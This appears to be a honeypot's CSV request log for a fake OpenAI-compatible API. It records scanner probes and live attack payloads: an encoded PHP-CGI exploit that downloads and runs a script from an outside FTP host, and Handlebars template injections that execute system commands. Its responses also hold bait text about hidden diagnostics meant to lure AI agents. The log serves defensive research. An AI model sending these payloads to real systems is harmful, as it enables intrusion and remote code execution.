request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
5db204b5-0602-49e9-803f-ad6df075304c,2026-05-05T09:52:07.892973+00:00,anon_bb55dd82,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",1,
f38df2ee-74d9-4923-ab31-c5acb3175212,2026-05-05T10:02:56.216128+00:00,anon_6b1bfd13,POST,/php-cgi/php-cgi.exe,[honeypot-host],python-requests/2.33.1,,174,316,1,,<?php phpinfo(); echo eval(base64_decode('ZWNobyAnW1NdJzsgc3lzdGVtKCdjdXJsIC1vIHQzLnBocCBmdHA6Ly9mdHAuaGtvcm8uYmVzdC90My5waHAgJiBwaHAgdDMucGhwJyk7IGVjaG8gJ1tFXSc7')); die()?>,<?php phpinfo(); echo eval(base64_decode('ZWNobyAnW1NdJzsgc3lzdGVtKCdjdXJsIC1vIHQzLnBocCBmdHA6Ly9mdHAuaGtvcm8uYmVzdC90My5waHAgJiBwaHAgdDMucGhwJyk7IGVjaG8gJ1tFXSc7')); die()?>,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
aec8c77f-ab86-48f9-8847-e855be136712,2026-05-05T10:21:45.638270+00:00,anon_976d4d35,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
26c0a82f-c938-42ae-a125-e23d2c7f027d,2026-05-05T10:40:29.394642+00:00,anon_551a0f73,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
35ecfef2-2412-4fb8-bfe6-fa7cf42bc375,2026-05-05T10:54:18.321011+00:00,anon_da1d32d0,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",1,
05a7367c-d9c7-41d6-bc4b-fe189a37d885,2026-05-05T10:55:14.353059+00:00,anon_02e2f139,GET,/actuator/gateway/routes,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5c627de7-7dde-4a80-95c2-51d1e5824fa0,2026-05-05T10:57:26.621960+00:00,anon_e6650463,GET,/.env,[honeypot-host],"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
509fc4cb-efac-4995-a18a-2c28cc6034c2,2026-05-05T11:04:53.556127+00:00,anon_c7d497bc,POST,/api/email/preview,[honeypot-host],Go-http-client/1.1,,600,316,1,,"{""editorTemplateData"":{""body"":[{""escaped"":true,""loc"":null,""params"":[{""data"":false,""depth"":0,""loc"":null,""original"":""this"",""parts"":[],""type"":""PathExpression""},{""loc"":null,""original"":1,""type"":""NumberLiteral"",""value"":""{},{})) + process.mainModule.require('child_process').execSync('echo __HBSRCE__;id;uname -a;hostname;nproc;echo __HBSRCE___END').toString() //""}],""path"":{""data"":false,""depth"":0,""loc"":null,""original"":""lookup"",""parts"":[""lookup""],""type"":""PathExpression""},""strip"":{""close"":false,""open"":false},""type"":""MustacheStatement""}],""loc"":null,""strip"":{},""type"":""Program""},""subject"":""Interactive RCE""}","{""editorTemplateData"":{""body"":[{""escaped"":true,""loc"":null,""params"":[{""data"":false,""depth"":0,""loc"":null,""original"":""this"",""parts"":[],""type"":""PathExpression""},{""loc"":null,""original"":1,""type"":""NumberLiteral"",""value"":""{},{})) + process.mainModule.require('child_process').execSync('echo __HBSRCE__;id;uname -a;hostname;nproc;echo __HBSRCE___END').toString() //""}],""path"":{""data"":false,""depth"":0,""loc"":null,""original"":""lookup"",""parts"":[""lookup""],""type"":""PathExpression""},""strip"":{""close"":false,""open"":false},""type"":""MustacheStatement""}],""loc"":null,""strip"":{},""type"":""Program""},""subject"":""Interactive RCE""}",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
26846163-f7e3-415d-b390-0cb37c6f9f25,2026-05-05T11:04:59.807585+00:00,anon_c7d497bc,POST,/api/email/preview,[honeypot-host],Go-http-client/1.1,,590,316,1,,"{""subject"":""Interactive RCE"",""template"":{""body"":[{""escaped"":true,""loc"":null,""params"":[{""data"":false,""depth"":0,""loc"":null,""original"":""this"",""parts"":[],""type"":""PathExpression""},{""loc"":null,""original"":1,""type"":""NumberLiteral"",""value"":""{},{})) + process.mainModule.require('child_process').execSync('echo __HBSRCE__;id;uname -a;hostname;nproc;echo __HBSRCE___END').toString() //""}],""path"":{""data"":false,""depth"":0,""loc"":null,""original"":""lookup"",""parts"":[""lookup""],""type"":""PathExpression""},""strip"":{""close"":false,""open"":false},""type"":""MustacheStatement""}],""loc"":null,""strip"":{},""type"":""Program""}}","{""subject"":""Interactive RCE"",""template"":{""body"":[{""escaped"":true,""loc"":null,""params"":[{""data"":false,""depth"":0,""loc"":null,""original"":""this"",""parts"":[],""type"":""PathExpression""},{""loc"":null,""original"":1,""type"":""NumberLiteral"",""value"":""{},{})) + process.mainModule.require('child_process').execSync('echo __HBSRCE__;id;uname -a;hostname;nproc;echo __HBSRCE___END').toString() //""}],""path"":{""data"":false,""depth"":0,""loc"":null,""original"":""lookup"",""parts"":[""lookup""],""type"":""PathExpression""},""strip"":{""close"":false,""open"":false},""type"":""MustacheStatement""}],""loc"":null,""strip"":{},""type"":""Program""}}",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2cc75222-2ad2-4841-82c0-c25266b1ed69,2026-05-05T11:05:00.306994+00:00,anon_c7d497bc,POST,/api/email/preview,[honeypot-host],Go-http-client/1.1,,585,316,1,,"{""subject"":""Interactive RCE"",""tpl"":{""body"":[{""escaped"":true,""loc"":null,""params"":[{""data"":false,""depth"":0,""loc"":null,""original"":""this"",""parts"":[],""type"":""PathExpression""},{""loc"":null,""original"":1,""type"":""NumberLiteral"",""value"":""{},{})) + process.mainModule.require('child_process').execSync('echo __HBSRCE__;id;uname -a;hostname;nproc;echo __HBSRCE___END').toString() //""}],""path"":{""data"":false,""depth"":0,""loc"":null,""original"":""lookup"",""parts"":[""lookup""],""type"":""PathExpression""},""strip"":{""close"":false,""open"":false},""type"":""MustacheStatement""}],""loc"":null,""strip"":{},""type"":""Program""}}","{""subject"":""Interactive RCE"",""tpl"":{""body"":[{""escaped"":true,""loc"":null,""params"":[{""data"":false,""depth"":0,""loc"":null,""original"":""this"",""parts"":[],""type"":""PathExpression""},{""loc"":null,""original"":1,""type"":""NumberLiteral"",""value"":""{},{})) + process.mainModule.require('child_process').execSync('echo __HBSRCE__;id;uname -a;hostname;nproc;echo __HBSRCE___END').toString() //""}],""path"":{""data"":false,""depth"":0,""loc"":null,""original"":""lookup"",""parts"":[""lookup""],""type"":""PathExpression""},""strip"":{""close"":false,""open"":false},""type"":""MustacheStatement""}],""loc"":null,""strip"":{},""type"":""Program""}}",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
32008014-0fcf-41ac-a37f-1673e4ef16c8,2026-05-05T11:42:51.359868+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
99000104-5f83-4fae-91c1-7fa50c3bd3d6,2026-05-05T12:13:44.178005+00:00,anon_9f080693,GET,/,,,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
9c6644d8-bcc8-4bf6-8e00-9d892f84aa1c,2026-05-05T12:48:48.684069+00:00,anon_9e8ec4c5,GET,/,[honeypot-host],Hello World/1.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
de9953b2-d6e0-4bdf-b982-d0644c9b2f75,2026-05-05T13:06:06.058854+00:00,anon_fb2ca1f9,GET,/admin/config.php,[honeypot-host],xfa1,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a2f5122d-e2ca-4931-98e3-cb88902eb90b,2026-05-05T13:12:37.748434+00:00,anon_858d2a39,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
67e616fb-ab32-48cb-bd11-9be0b8b45bbd,2026-05-05T13:24:54.797564+00:00,anon_fd0e70b9,GET,/hudson,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
e7f87602-ad1e-4210-b5ac-e2e8bdb7ffd0,2026-05-05T13:54:23.305394+00:00,anon_a873fcd4,GET,/login,[honeypot-host],Go-http-client/1.1,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
00c5a522-4422-4909-9b54-90e0b4a7e258,2026-05-05T14:16:43.399444+00:00,anon_d434b05b,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d498dfcb-9b5c-410d-b4cd-0aa06a7bcd3a,2026-05-05T14:51:16.311214+00:00,anon_cdb61d51,GET,/login,[honeypot-host],Go-http-client/1.1,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
946591ca-41eb-42db-a1b9-225080551f96,2026-05-05T14:56:43.907853+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
